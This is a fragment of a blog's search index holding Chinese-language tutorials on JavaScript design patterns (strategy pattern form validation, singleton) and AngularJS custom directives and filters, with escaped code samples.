执行表单验证函数// 添加验证规则 let validator = new Validate(); // 创建一个 Validate 类，作用是作为 `Context`，负者接收用户的输入并将用户输入的内容委托给 `strategy` 对象。 validator.add(regForm.userName, [ &#123; strategy: &quot;isNotEmpty&quot;, errorMsg: &quot;用户名不能为空&quot;, &#125;, &#123; strategy: &quot;minLength:6&quot;, errorMsg: &quot;密码长度不能小于六位&quot; &#125;]); validator.add(regForm.userPassword, [&#123; strategy: &quot;minLength:6&quot;, errorMsg: &quot;密码长度不能小于六位&quot; &#125;]); validator.add(regForm.phoneNumber, [&#123; strategy: &quot;legalPhone&quot;, errorMsg: &quot;手机号格式不正确&quot; &#125;]); validator.add(regForm.userEmail, [&#123; strategy: &quot;legalEmail&quot;, errorMsg: &quot;邮箱格式不正确&quot; &#125;]); return validator.start(); // 返回校验结果&#125;; 如上，validate 类的 add 方法用于向我们的 strategy 的对象添加校验规则，它接收两参数:参与校验的 input 输入框以及一个数组，数组中存放的是验证的策略规则和验证失败返回的提示信息。 下面是 validate 对象的具体实现: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546let Validate = function () &#123; // 验证表单的类 // Validate 类作为 Context，负者接收用户的请求并委托给 strategies 对象 this.cache = [];// 保存验证规则的数组&#125;;Validate.prototype = &#123; constructor: Validate, add: function (dom, rules) &#123; // 规则关联，将规则与对应的元素进行绑定，并返回验证结果 let self = this; for (let i =0, rule; rule = rules[i++];)&#123; (function (rule) &#123; let strategyArr = rule.strategy.split(&quot;:&quot;); // 参数解析 let errorMsg = rule.errorMsg; // 获取错误信息 self.cache.push(function() &#123; // 推入策略规则 let strategy = strategyArr.shift(); // 首先截取策略名称 strategyArr.unshift(dom.value); // 添加 dom 的内容 strategyArr.push(errorMsg); // 推入错误信息 return strategies[strategy].apply(dom, strategyArr); // 信息策略，并返回校验结果 &#125;); &#125;)(rule); &#125; &#125;, start: function () &#123; for (let i = 0, validaterFunc; validaterFunc = this.cache[i++];) &#123; let msg = validaterFunc(); // 开始校验，并取得校验后的返回信息 if (msg) &#123; // 如若有返回值，说明校验不成功 return msg; &#125; &#125; &#125;,&#125;; 当我们往 validate 对象添加完校验规则以后，便调用 validate.start 方法来启动校验，该方法返回的 errorMsg 字符串代表校验没有通过，那么便需要调用 regForm.onsubmit 方法返回 false 阻止表单的提交。 123456789 regForm.onsubmit = function () &#123; let errorMsg = validateFunc(); // 若，validateFunc 没有任何值返回，则代表校验通过 if (errorMsg) &#123; alert(errorMsg); return false;// 阻止表单提交 &#125; &#125; 策略模式实现表单验证策略模式date: 2017-02-06tags: [‘JavaScript’,’JS设计模式’]toc: truecategories: technology 0x00 策略模式策略模式 的定义是: 定义一系列算法，把他们一个个封装起来，并且使他们可以相互替换 0x01 策略模式实现缓动动画策略模式的一个经典运用场景就是缓动动画。 其核心思想是使用策略模式把算法传入动画类库中，来达到给种不同的缓动效果，而这些算法可以轻易的被另一个算法替代。 12345678910111213141516let tween = &#123;// 动画类库，用于封装缓动算法// t:动画已经消耗的时间// b:小球的原始位置// c:小球目标位置// d:动画持续的总时间 linear: function (t, b, c, d) &#123; return c * t / d + b; &#125;, easeIn: function (t, b, c, d) &#123; return c * (t /= d) * t + b; &#125;, strongEaseIn: function (t, b, c, d) &#123; return c * (t /= d) * t * t * t * t + b; &#125;&#125;; 完整代码:策略模式-缓动动画 0x02 策略模式实现表单验证其实，仅仅把策略模式用于封装算法有点大材小用，实际开发中，通常会把算法的含义扩散开来，使策略模式可以用来封装一系列的 业务规则。 在一个 Web 项目中，表单验证往往是在所难免的，当需要验证的字段很少的时候，比如几条，十几条，没问题，我们完全可以重复的使用 if...else 去验证表单字段，但如一个表单中的字段多大几十个，甚至上百个时，考虑到代码的可复用性和后期的可以维护性，便十分有必要使用一些模式去组织我们的代码了。 比如，策略模式。 使用策略模式编写表单校验代码的第一步就是将校验逻辑都封装成为策略对象: 1234567891011121314151617181920212223242526272829let strategies = &#123; // 策略对象，封装验证表单的规则 isNotEmpty: function (value, errorMsg) &#123; if (value == &apos;&apos;) &#123; return errorMsg; &#125; &#125;, minLength: function (value, length, errorMsg) &#123; if (value.length &lt; length) &#123; return errorMsg; &#125; &#125;, legalPhone: function (value, errorMsg) &#123; let regPhone = /^1[345678]\d&#123;9&#125;$/g; if (!regPhone.test(value)) &#123; return errorMsg; &#125; &#125;, legalEmail: function (value, errorMsg) &#123; let regEmail = /^\w&#123;1,18&#125;@([a-z][0-9])&#123;2,7&#125;.[a-z]&#123;2,4&#125;$/i; if (!regEmail.test(value)) &#123; return errorMsg; &#125; &#125;&#125;; 然后，我们会创建 Validate 类，它的作用是作为 Context，负者接收用户的输入并将用户输入的内容委托给 strategy 对象。 1234567891011121314151617181920212223242526272829let validateFunc = function () &#123;// validateFunc 执行表单验证函数// 添加验证规则 let validator = new Validate(); // 创建一个 Validate 类，作用是作为 `Context`，负者接收用户的输入并将用户输入的内容委托给 `strategy` 对象。 validator.add(regForm.userName, [ &#123; strategy: &quot;isNotEmpty&quot;, errorMsg: &quot;用户名不能为空&quot;, &#125;, &#123; strategy: &quot;minLength:6&quot;, errorMsg: &quot;密码长度不能小于六位&quot; &#125;]); validator.add(regForm.userPassword, [&#123; strategy: &quot;minLength:6&quot;, errorMsg: &quot;密码长度不能小于六位&quot; &#125;]); validator.add(regForm.phoneNumber, [&#123; strategy: &quot;legalPhone&quot;, errorMsg: &quot;手机号格式不正确&quot; &#125;]); validator.add(regForm.userEmail, [&#123; strategy: &quot;legalEmail&quot;, errorMsg: &quot;邮箱格式不正确&quot; &#125;]); return validator.start(); // 返回校验结果&#125;; 如上，validate 类的 add 方法用于向我们的 strategy 的对象添加校验规则，它接收两参数:参与校验的 input 输入框以及一个数组，数组中存放的是验证的策略规则和验证失败返回的提示信息。 下面是 validate 对象的具体实现: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546let Validate = function () &#123; // 验证表单的类 // Validate 类作为 Context，负者接收用户的请求并委托给 strategies 对象 this.cache = [];// 保存验证规则的数组&#125;;Validate.prototype = &#123; constructor: Validate, add: function (dom, rules) &#123; // 规则关联，将规则与对应的元素进行绑定，并返回验证结果 let self = this; for (let i =0, rule; rule = rules[i++];)&#123; (function (rule) &#123; let strategyArr = rule.strategy.split(&quot;:&quot;); // 参数解析 let errorMsg = rule.errorMsg; // 获取错误信息 self.cache.push(function() &#123; // 推入策略规则 let strategy = strategyArr.shift(); // 首先截取策略名称 strategyArr.unshift(dom.value); // 添加 dom 的内容 strategyArr.push(errorMsg); // 推入错误信息 return strategies[strategy].apply(dom, strategyArr); // 信息策略，并返回校验结果 &#125;); &#125;)(rule); &#125; &#125;, start: function () &#123; for (let i = 0, validaterFunc; validaterFunc = this.cache[i++];) &#123; let msg = validaterFunc(); // 开始校验，并取得校验后的返回信息 if (msg) &#123; // 如若有返回值，说明校验不成功 return msg; &#125; &#125; &#125;,&#125;; 当我们往 validate 对象添加完校验规则以后，便调用 validate.start 方法来启动校验，该方法返回的 errorMsg 字符串代表校验没有通过，那么便需要调用 regForm.onsubmit 方法返回 false 阻止表单的提交。 123456789 regForm.onsubmit = function () &#123; let errorMsg = validateFunc(); // 若，validateFunc 没有任何值返回，则代表校验通过 if (errorMsg) &#123; alert(errorMsg); return false;// 阻止表单提交 &#125; &#125; 策略模式实现表单验证]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[JS设计模式(0)漫话设计模式]]></title>
      <url>%2F2017%2F02%2F06%2FJS%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F(0)%E6%BC%AB%E8%AF%9D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%2F</url>
      <content type="text"><![CDATA[0x00 设计模式设计模式的定义的是：在面向对象软件设计过程中针对特定问题的简洁而又优雅的解决方案。 俗一点，设计模式就是套路，高逼格的套路，但是这种套路是有用，它给出了在某种场合下对某个问题的一种解决方案，更通俗一点，设计模式就是给面向对象软件开发中的一些好的设计取个好的名字。 因为一个好的设计方案只有有了名字之后，才能更好地传播，并使得人们有更多的机会去分享和学习他们。 但是从某些角度来看，设计模式可能会增加代码量，也会把系统的逻辑搞定更复杂。但是，只要当程序足够复杂，设计模式的作用便突显出现了，它会使得人们写出可复用性和可维护性更高的代码。 一个程序的设计总是可以分为可变的部分和不可变的部分。而所有设计模式的实现都遵循一条原则:查找程序中变化的部分，并将变化的部分封装起来。 0x01 JavaScript 中的设计模式对于不同的语言，相同的设计模式的差异还是很大的]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[JS设计模式(1)单例模式]]></title>
      <url>%2F2017%2F02%2F06%2FJS%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%9E%8B(1)%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F%2F</url>
      <content type="text"><![CDATA[0x00 全局变量首先需要明确的一点是，全局变量并不是单例模式。虽然，我们经常在 JavaScript 的开发中将全局变量当做单例来使用。 而对于全局变量，其最大的问题莫过于造成命名空间污染。 而为了最大程度的减少命名冲突，最常用的手段是使用闭包构建块级作用域以封装私有变量。 0x01 惰性单例惰性单例 指的是在需要的时候才创建实例，并且只创建一个实例。 12345678let getSingle = function (fn) &#123; let result;// result 变量存在于闭包中，永远不会被销毁，而在将来的请求在中，如果// result 已经被赋值，那么它将返回该值。 return function () &#123; return result || (result = fn.apply(this, arguments)); &#125;&#125;; 单例模式将会非常有用，比如可以用来创建一个唯一的登录浮窗对象，但是，我们并不希望这个浮窗在页面加载完成的时候就已经创建完成，因为有时候用户可能并不会登录，而是希望当用户点击登录按钮时才创建浮窗。 123456789101112131415let createLoginLayer = function () &#123; let div = document.createElement(&apos;div&apos;); div.innerHTML = &quot;我是登录浮窗&quot;; div.id = &quot;loginLayer&quot;; div.style.display = &quot;none&quot;; document.body.appendChild(div); return div;&#125;;let createSingleLoginLayer = getSingle(createLoginLayer);document.querySelector(&quot;#logBtn&quot;).onclick = function (e) &#123; let loginLayer = createSingleLoginLayer(); loginLayer.style.display = &apos;block&apos;;&#125; 单例模式最巧妙的地方在于，创建对象和管理单例的职责 被分布在两个不同的方法中，而只有当这两个方法组合起来才能发挥出单例模式的威力。 单例模式的核心是确保只有一个实例，并提供全局访问]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[AngularJS(8)创建复杂指令]]></title>
      <url>%2F2017%2F02%2F05%2FAngularJS(8)%E5%88%9B%E5%BB%BA%E5%A4%8D%E6%9D%82%E6%8C%87%E4%BB%A4%2F</url>
      <content type="text"><![CDATA[0x00 定义复杂指令以下是自定义指令对象所定义的属性: link: 为指令指定一链接函数； compile: 指定一个编译函数； restrict: 指定指令如何被使用； template: 指定一被嵌入到 HTML 文档的模板； templateUrl: 指定一个外部 HTML 模板； scope: 创建一个新的作用域或者隔离作用域； controller: 为指令创建一个控制器； replace: 指定模板内容是否替换指令所应用到的元素； require: 声明对某个控制器的依赖； transclude: 指令是否被用于包含任意内容。 当指令只返回一个链接函数时，所创建的指令只能被当做一个属性来使用，此时，我们可以通过 restrict 属性来修改默认配置，其对应的属性值有 E(将指令用作一个元素),A(将指令用作一个属性),C(将指令用作一个类),M(将指令用作一个注释)。 使用指令模板使用 template清单8-1%E5%88%9B%E5%BB%BA%E5%A4%8D%E6%9D%82%E6%8C%87%E4%BB%A4/%E6%B8%85%E5%8D%958-1.html) 生成一个模板，最简单的方式就是使用 template 属性，为其写入要生成的模板内容。 如上清单所示，其核心代码如下: 123456789.directive(&quot;unorderedList&quot;, function () &#123; return &#123; link: function (scope, ele, attrs) &#123; scope.data = scope[attrs[&quot;unorderedList&quot;]]; &#125;, restrict: &quot;A&quot;, template: &quot;&lt;ul&gt;&lt;li ng-repeat=&apos;item in data&apos;&gt;&quot; +&quot;&#123;&#123;item.price | currency&#125;&#125;&lt;/li&gt;&lt;/ul&gt;&quot; &#125;&#125;) 但是 template 属性的灵活性也是显而易见的，就是并不怎么灵活。所以 AngularJS 还提供了 templateUrl 属性以提供外部来进行指令渲染。 使用 tempateUrl清单8-2%E5%88%9B%E5%BB%BA%E5%A4%8D%E6%9D%82%E6%8C%87%E4%BB%A4/%E6%B8%85%E5%8D%958-2.html) 如上清单所示，其核心代码如下: 123456789.directive(&quot;unorderedList&quot;, function () &#123; return &#123; link: function (scope, ele, attrs) &#123; scope.data = scope[attrs[&quot;unorderedList&quot;]]; &#125;, restrict: &quot;A&quot;, templateUrl: &quot;itemTemplate.html&quot; &#125;&#125;) 当然，我们还可以更灵活的使用 templateUrl 属性，即是为其指定一个函数使其动态的选择需要展示自定义指令的模板。 传递给 templateUrl 属性的函数接收一个代表指令所应用的元素以及该元素上定义的属性集。 使用 replace默认情况下使用 templateUrl 指定的模板，将会作为指令所在元素的子元素被插入。为 replace 指定属性值 true 便会替换所在的父级元素。 0x01 管理指令作用域简单的将，我们可以为自定义指令的 scope 属性设置为 true，从而为指令所应用到的每一个实例创建独立的作用域，这种方式使得我们在一定程度上减少了控制器的数量，即不用使用大量的控制器以分隔作用域就可以复用自定义指令，但是我们所定义的自定义指令仍然会受到顶层控制器的支配，作用域继承规则总是有效的。 单向数据绑定我们渴望创建一纯粹独立的自定义指令，不受任何控制器或作用域层次上的继承关系的影响，以在任何地方重用该指令。解决的方案是将 scope 属性设置为对象，通过对对象定义的属性做修改便不会被传播到控制器作用域上，因此此时，作用域的隔离是从作用域层次结构上别隔离的，即指令和控制器之间的作用域没有任何关系。 在这种情况下，便可以自定义指令的中 scope 对象上的特殊属性 @prop 实现单项数据绑定(从控制器作用域流向自定义指令作用域): 1234567891011121314151617181920212223242526&lt;script type=&quot;text/ng-template&quot; id=&quot;scopeTemplate&quot;&gt; &lt;div class=&quot;panel-body&quot;&gt; &lt;p&gt;Data Value: &#123;&#123;local&#125;&#125;&lt;/p&gt; &lt;/div&gt;&lt;/script&gt;&lt;div class=&quot;panel panel-default&quot; ng-controller=&quot;scopeCtrl&quot; &gt; &lt;div class=&quot;panel-body&quot;&gt; Direct binding: &lt;input ng-model=&quot;data.name&quot;&gt; &lt;/div&gt; &lt;div class=&quot;panel-body&quot; scope-demo=&quot;&quot; nameprop=&quot;&#123;&#123;+ &apos;from Chinese&apos;&#125;&#125;&quot;&gt;&lt;/div&gt;&lt;/div&gt;angular.module(&apos;exampleApp&apos;, []) .directive(&quot;scopeDemo&quot;, function () &#123; return &#123; template: function () &#123; return angular.element(document.querySelector(&apos;#scopeTemplate&apos;)).html(); &#125;, scope: &#123; local: &apos;@nameprop&apos; &#125; &#125; &#125;).controller(&quot;scopeCtrl&quot;, function ($scope) &#123; $scope.data = &#123;name: &quot;jack&quot;&#125;; $scope.city = &quot;london&quot;; &#125;) 清单8-3%E5%88%9B%E5%BB%BA%E5%A4%8D%E6%9D%82%E6%8C%87%E4%BB%A4/%E6%B8%85%E5%8D%958-3.html) 双向数据绑定当然， 我们还可以创出双向数据绑定，只需要使用 =prop 特性就可以了: 1234567&lt;p&gt;Data Value: &lt;input ng-model=&quot;local&quot;&gt;&lt;/p&gt;scope: &#123; local: &apos;=nameprop&apos; &#125; &lt;div class=&quot;panel-body&quot; scope-demo=&quot;&quot; nameprop=&quot;data.name&quot;&gt;&lt;/div&gt; 计算表达式下面的 Demo 将演示，如何将控制器作用域中的函数与自定义指令进行关联，并对来自控制器作用域中的数据进行计算或传递给自定义指令。 需要使用 &amp;Fnuc 特性来讲所指定特性的值绑定到一个函数。 123456789101112131415161718192021222324252627282930&lt;script type=&quot;text/ng-template&quot; id=&quot;scopeTemplate&quot;&gt; &lt;div class=&quot;panel-body&quot;&gt; &lt;p&gt;Name: &#123;&#123;local&#125;&#125;, City:&#123;&#123;cityFn(&#123;nameVal: local&#125;)&#125;&#125;&lt;/p&gt; &lt;/div&gt;&lt;/script&gt;angular.module(&apos;exampleApp&apos;, []) .directive(&quot;scopeDemo&quot;, function () &#123; return &#123; template: function () &#123; return angular.element(document.querySelector(&apos;#scopeTemplate&apos;)).html(); &#125;, scope: &#123; local: &apos;=nameprop&apos;, cityFn: &quot;&amp;city&quot; &#125; &#125; &#125;).controller(&quot;scopeCtrl&quot;, function ($scope) &#123; $scope.data = &#123; name: &quot;Jack&quot;, defaultCity: &quot;China&quot; &#125;; $scope.getCity = function (name) &#123; return name == &quot;Jack&quot; ? $scope.data.defaultCity : &quot;Unknown&quot;; &#125; &#125;) &#125; &lt;div class=&quot;panel-body&quot; scope-demo=&quot;&quot; city=&quot;getCity(nameVal)&quot; nameprop=&quot;data.name&quot;&gt;&lt;/div&gt; 清单8-4%E5%88%9B%E5%BB%BA%E5%A4%8D%E6%9D%82%E6%8C%87%E4%BB%A4/%E6%B8%85%E5%8D%958-4.html) 使用隔离作用域的数据最后，可以为表达式传递一个控制器作用域上没有被定义过的属性名，来实现将隔离作用域的数据作为控制器作用域表达的一部分。 12345&lt;!--修改指令模板数据--&gt;&lt;p&gt;Name: &#123;&#123;local&#125;&#125;, City:&#123;&#123;cityFn(&#123;nameVal: local&#125;)&#125;&#125;&lt;/p&gt;&lt;!--修改指令实例--&gt;&lt;div class=&quot;panel-body&quot; scope-demo=&quot;&quot; city=&quot;getCity(nameVal)&quot; nameprop=&quot;data.name&quot;&gt;&lt;/div&gt;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[AngularJS(6)使用过滤器]]></title>
      <url>%2F2017%2F02%2F04%2FAngularJS(6)%E4%BD%BF%E7%94%A8%E8%BF%87%E6%BB%A4%E5%99%A8%2F</url>
      <content type="text"><![CDATA[0x00 关于过滤器过滤器在数据从作用域传递到指令上时进行转换，但不改变源数据，这样可以允许同一份数据在应用中以不同的形式展示。 理论上，过滤器可以执行任何类型的转换，但是大多情况下用于格式化或者对数据以某种顺序排序。 0x01 过滤单个数据的值AngularJS 有两种类型的内置过滤器:一类对单个数据值，另一类对数据集合进行操作。 用于单个数据的内置过滤器： currency: 对货币值进行格式化； date: 对时间进行格式化； json: 从 JSON 字符串中生成一个对象； number: 对数字值进行格式化； uppercase，lowercase：大小写格式化。 过滤器可以进行链式调用，这样便可以使用多个过滤器按照一定的顺序对同一数据进行操作。 0x02 过滤集合AngularJS 包含了三个内置的集合过滤器: limitTo: 从一个数组中选出一定数量的对象； filter: 从数组中选取对象； orderBy: 对数组中的对象进行排序。 限制项目数量limitTo 过滤器可以限制从一个数据对象构成的数组中取出的项目的数量。 清单6-1%E4%BD%BF%E7%94%A8%E8%BF%87%E6%BB%A4%E5%99%A8/%E6%B8%85%E5%8D%956-1.html) 如上清单所示，其核心代码如下: 123456789$scope.limitVal = &quot;5&quot;;$scope.limitRange = [];for(let i = (0 - $scope.products.length); i &lt;= $scope.products.length;i ++)&#123; $scope.limitRange.push(i.toString());&#125;Limit: &lt;select ng-model=&quot;limitVal&quot; ng-options=&quot;item for item in limitRange&quot;&gt;&lt;/select&gt;&lt;tr ng-repeat=&quot;p in products | limitTo:limitVal&quot;&gt; limitTo 过滤器的值被指定为一个变量。而当该变量为负数时，例如 -5，过滤器会从数组中选出最后的五个对象。 选取项filter 过滤器用于从数组中选出一些对象。选取的条件可以是表达式，一个匹配属性值的 map 对象，或者一个函数。 比如，使用 map 对象选取对象: 1&lt;tr ng-repeat=&quot;p in products | filter: &#123;category: &apos;Fish&apos;&#125; | limitTo:limitVal&quot;&gt; 清单6-2%E4%BD%BF%E7%94%A8%E8%BF%87%E6%BB%A4%E5%99%A8/%E6%B8%85%E5%8D%956-2.html) 对项目排序orderBy 过滤器可对数组中的对象进行排序。 1&lt;tr ng-repeat=&quot;p in products | limitTo:limitVal | orderBy: &apos;-price&apos;&quot;&gt; 在只设定了一个属性名的情况下，相当于隐式的请求过滤器为对象进行生序排序，可以通过使用 + 或 - 字符来设置排序顺序。 注意此处的属性名使用了引号: ‘price’ 而不是 price。没有引号，过滤器会将该属性看作一个作用域变量或者控制器变量。 当然，按照某个属性的值进行排序是最简单的一种方式，orderBy 过滤器也能使用一个函数进行排序，用于排序的函数需要传入一个数据数组中的对象，然后再返回一个在排序时用于参考的对象或者值。 清单6-3%E4%BD%BF%E7%94%A8%E8%BF%87%E6%BB%A4%E5%99%A8/%E6%B8%85%E5%8D%956-3.html) 函数 myCustomSorter 的作用是将 expiry 值小于 100 的项放到数据数组的前面。 最后，orderBy 还支持使用多个谓语进行排序，即通过为 orderBy 过滤器配置为使用一个属性名或者函数名构成的数组，用于依次进行排序。 1&lt;tr ng-repeat=&quot;p in products | orderBy: [myCustomeSorter, &apos;-price&apos;]&quot;&gt; 清单6-4%E4%BD%BF%E7%94%A8%E8%BF%87%E6%BB%A4%E5%99%A8/%E6%B8%85%E5%8D%956-4.html) 0x03 使用自定义过滤器过滤器由 Module.filter 方法创建，该方法接收两个参数:过滤器名称和一个工厂函数，该函数用于创建实际工作的 work 函数。 创建格式化数据值的过滤器清单6-5%E4%BD%BF%E7%94%A8%E8%BF%87%E6%BB%A4%E5%99%A8/%E6%B8%85%E5%8D%956-5.html) 如上，在清单中创建了 labelCase 过滤器，它会将一个字符串格式化为只有首字母是大写的。 在将该过滤器应用于 category 属性时指定了配置项为 true,将会颠倒过滤器所应用的大小写转换过程。 创建一个集合过滤器清单6-6%E4%BD%BF%E7%94%A8%E8%BF%87%E6%BB%A4%E5%99%A8/%E6%B8%85%E5%8D%956-6.html) 如清单中所示，过滤器 skip 将会跳过数组对象中的前两项并选出之后的五项。 组合过滤器我们可以在已有过滤器的基础上将多个过滤器的功能合并到单个过滤器中。 123456.filter(&quot;take&quot;, function ($filter) &#123; return function (data, skipCount, takeCount) &#123; let skippedData = $filter(&quot;skip&quot;)(data, skipCount); return $filter(&quot;limitTo&quot;)(skippedData, takeCount); &#125;&#125;); 如上，首先在工厂函数中声明对 $filter 服务的依赖，如此便可以访问模块中所有已经定义的过滤器。 过滤器在工人函数中通过名称来访问和调用: 1let skippedData = $filter(&quot;skip&quot;)(data, skipCount); 清单6-7%E4%BD%BF%E7%94%A8%E8%BF%87%E6%BB%A4%E5%99%A8/%E6%B8%85%E5%8D%956-7.html)]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[AngularJS(7)创建自定义指令]]></title>
      <url>%2F2017%2F02%2F04%2FAngularJS(7)%E5%88%9B%E5%BB%BA%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8C%87%E4%BB%A4%2F</url>
      <content type="text"><![CDATA[0x00 创建自定义指令使用 Module.directive 方法来创建自定义指令，接收的两个参数是:要创建的新指令的名称和一个用于创建该指令的工厂函数。 同样工厂函数会返回一个 worker 函数，在自定义指令中，这个 worker 函数被称为链接函数，它提供了将指令与 HTML 文档和作用域数据相连接的方法。 链接函数链接函数接收三个参数:指令被应用到的视图的作用域(scope)，指令被应用到的 HTML 元素(element)，以及 HTML 元素的属性(attrs)。 scope, element, attrs 参数是普通的 JavaScript 参数，而不是通过依赖注入提供的，这意味着被传入链接函数的对象的顺序应是固定的。 123456angular.module(&quot;exampleApp&quot;, []).directive(&quot;unorderedList&quot;, function()&#123; return function (scope, element, attrs) &#123; // do something &#125;&#125;) 然后可以将指令当作一个属性来使用: 1&lt;div unordered-list=&quot;products&quot;&gt;&lt;/div&gt; 注意属性名和传给 directive 方法的名称是不同的: unordered-list 和 unorderedList。传给方法的参数中每个大写字母被认为是属性名中一个独立的词，而每个词之间用一个连字符隔开。 从作用域获取数据与 AngularJS 控制器不同，自定义指令并不声明对 $scope 服务的依赖，传入的是指令被应用到的视图的控制器所创建的作用域。 这样设计的目的允许单个指令在一个应用程序中被使用多次，而每个应用程序可能是在作用域层次结构上不同作用域上工作的。 链接函数的第三个参数是一个按照名字索引的属性结合，要从作用域中获取数据，可以通过该参数获得对应的属性值。 123456789.directive(&quot;unorderedList&quot;, function()&#123; console.log(&quot;dafa&quot;) return function (scope, element, attrs) &#123; let data = scope[attrs[&quot;unorderedList&quot;]]; if (angular.isArray(data))&#123; console.log(data); &#125; &#125;&#125;) 从 attrs 集合中使用 unorderedList 作为 key 来获取相关值，然后传给 scope 对象来获取相关数据。 1let data = scope[attrs[&quot;unorderedList&quot;]]; 生成 HTML 元素AngularJS 包含了一个裁剪版的 jQuery，成为 jqLite，他具备jQuery的大多数功能。 jqLite 的功能通过链接函数的 element 参数暴露出来。 1234567if (angular.isArray(data))&#123; let listElem = angular.element(&quot;&lt;ul&gt;&quot;); element.append(listElem); for(let i =0;i &lt; data.length;i++)&#123; listElem.append(angular.element(&apos;&lt;li&gt;&apos;).text(data[i].name)); &#125;&#125; 清单7-1%E5%88%9B%E5%BB%BA%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8C%87%E4%BB%A4/%E6%B8%85%E5%8D%957-1.html) 打破数据依赖清单7-1 中的指令存在对于数据属性的依赖，因为它假定对象都有一个 name 属性。 1listElem.append(angular.element(&apos;&lt;li&gt;&apos;).text(data[i].name)); 这种依赖将导致我们无法在别处或者其它应用程序钟使用该指令。 解决这个问题的最简单的办法是定义一个额外的属性，用来指定哪个属性值会被显示在 li 项目中。 1234567891011let data = scope[attrs[&quot;unorderedList&quot;]];let propertyName = attrs[&quot;listProperty&quot;];if (angular.isArray(data)) &#123; let listElem = angular.element(&quot;&lt;ul&gt;&quot;); element.append(listElem); for (let i = 0; i &lt; data.length; i++) &#123; listElem.append(angular.element(&apos;&lt;li&gt;&apos;).text(data[i][propertyName])); &#125;&#125;&lt;div unordered-list=&quot;products&quot; list-property=&quot;name&quot;&gt;&lt;/div&gt; 清单7-2%E5%88%9B%E5%BB%BA%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8C%87%E4%BB%A4/%E6%B8%85%E5%8D%957-2.html) 添加一个额外的属性是最简单的方法，它存在的问题是无法灵活的应用指令，比如当为其添加一个过滤器时，自定义指令将被破坏。 1&lt;div unordered-list=&quot;products&quot; list-property=&quot;price | currency&quot;&gt;&lt;/div&gt; 解决该问题的方案是使用 scope.$eval() 方法，让作用域将属值当作一个表达式来计算，该方法接收的是要计算的表达式和用于执行该计算的数据。 计算表达式12345let propertyExpression = attrs[&quot;listProperty&quot;];for (let i = 0; i &lt; data.length; i++) &#123; listElem.append(angular.element(&apos;&lt;li&gt;&apos;).text(scope.$eval(propertyExpression, data[i])));&#125; 清单7-3%E5%88%9B%E5%BB%BA%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8C%87%E4%BB%A4/%E6%B8%85%E5%8D%957-3.html) 处理数据变化上述所有的清单中，在 AngularJS 处理时 li 元素的内容就已经被设置了，并且在底层的数据变化时无法自动更新。 清单7-4%E5%88%9B%E5%BB%BA%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8C%87%E4%BB%A4/%E6%B8%85%E5%8D%957-4.html) 如上，在清单中当点击 button 按钮是，price 也将会逐次累加。 其核心代码如下: 12345678910111213141516171819202122232425.directive(&quot;unorderedList&quot;, function () &#123; return function (scope, element, attrs) &#123; let data = scope[attrs[&quot;unorderedList&quot;]]; let propertyExpression = attrs[&quot;listProperty&quot;]; if (angular.isArray(data)) &#123; let listElem = angular.element(&quot;&lt;ul&gt;&quot;); element.append(listElem); for (var i = 0; i &lt; data.length; i++) &#123; ( function () &#123; let itemElement = angular.element(&apos;&lt;li&gt;&apos;); listElem.append(itemElement); var index = i; let watcherFn = function (watchScope) &#123; return watchScope.$eval(propertyExpression, data[index]); &#125;; scope.$watch(watcherFn,function (newValue, oldValue) &#123; itemElement.text(newValue); &#125;) &#125;()); &#125; &#125; &#125;&#125;) 我们使用了 $watch 方法来监控作用域中的变化，并定义了一个监听器函数 watcheFn,该函数然我们可以从容面对表达式中可能带有过滤器的数据值的情况。 每次 watcherFn 函数被重新计算时，该函数作为参数被传递给作用域，另外使用了 $eval 函数计算在使用的表达式。 然后将 watcherFn 函数传递个 $watch 函数并指定回调函数，该回调函数使用 jqLite 的 text 方法更新 li 元素的文本内容。 最后，归于 JavaScript 的特性，防止 index 被 for 循环的下一次迭代所更新，使用了 IIFE (即立即执行函数表达式)。 0x01 使用 jqLite DOM 导航对于简单的指令通常并不需要对 DOM 进行导航，因为已经对链接函数传入 element 参数了，该参数代表的是指令所引用到的元素的 jqLite 对象。但对于一些更复杂的指令，仍然需要对元素层次结构进行遍历并定位或者更复杂的 DOM 操作。 以下是 DOM 导航的 jqLite 方法: children(): 返回一组子元素(jqLite 对象)； eq(): 返回指定索引下的元素(jqLite 对象)； find(tag): 按照指定的 tag 名称定位所有的后代元素(jqLite 对象)； next(): 获取下一个兄弟元素(jqLite 对象)； parent(): 返回父元素(jqLite 对象)。 清单7-5%E5%88%9B%E5%BB%BA%E8%87%AA%E5%AE%9A%E4%B9%89%E6%8C%87%E4%BB%A4/%E6%B8%85%E5%8D%957-5.html) 如上清单所示，其核心代码如下: 123456let items = element.children();for ( let i=0;i&lt;items.length;i++)&#123; if (items.eq(i).text() == &quot;Oranges&quot;)&#123; items.eq(i).css(&#123;&quot;font-weight&quot;:&quot;bold&quot;,&quot;color&quot;:&quot;red&quot;&#125;) &#125;&#125; 如上，使用 eq() 方法将获得一个指定索引下的元素的 jqLite 对象。而不是将 jqLite 对象当做 JavaScript 数组来处理(例如 items[i])，因为这样得到的将是 HTMLElement 对象。 此外，值得注意的是，children 只会返回指定元素下的所有直接子元素，而不包括所有后代，要获得所有的后代元素可以使用 find 方法。 创建和移除元素以下是用于创建和移除元素的 jqLite 方法: angular.element(html): 创建一个 jqLite 对象； after(elem): 在元素后面插入内容； append(elem): 将元素作为最后一个子元素插入； clone(): 复制一个 jqLite 对象； prepend(elem): 将元素作为第一个子元素插入； remove(): 从 DOM 中删除 jqLite 对象的元素； replaceWith(elem): 用指定元素替换调用方法的 jqLite 对象的元素； wrap(elem): 使用特定元素包裹 jqLite 对象中的每个元素。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Mongodb(1)在Kali中使用Mongodb]]></title>
